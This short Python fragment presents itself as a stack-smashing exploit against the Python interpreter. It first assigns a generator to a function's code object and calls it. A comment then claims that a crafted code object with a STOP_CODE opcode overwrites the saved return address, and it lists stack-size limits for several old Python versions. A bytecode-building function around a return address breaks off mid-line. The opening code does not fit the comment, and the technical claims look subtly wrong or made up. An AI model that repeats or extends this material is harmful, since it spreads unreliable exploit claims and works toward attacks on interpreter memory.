fn = lambda: None
gi = (i for i in ())
fn.__code__ = gi
fn()

#
# This is another stack-smashing attack.  The code object is
# constructed with a large stack size, and the first opcode is
# 'STOP_CODE'.  This is a special opcode that stops execution
# immediately.  However, the stack is still popped, and overwrites
# the saved return address.
#
# The exact same technique can be used to exploit a buffer overflow
# in Python 1.5.2.  The only difference is that the code object is
# constructed with a stack size of 0x7fffffff.  In Python 1.6, the
# stack size is limited to 0x800.  In Python 2.0, the stack size is
# limited to 0x200.
#

import struct

def gen_code(stack_size, retaddr):
    return struct.pack('<H', stack_size) + '\x00\x00' + '\x64\x00\x00\x00' + \
           '\x00\x00\x00\x00' + '\x00\x00\x
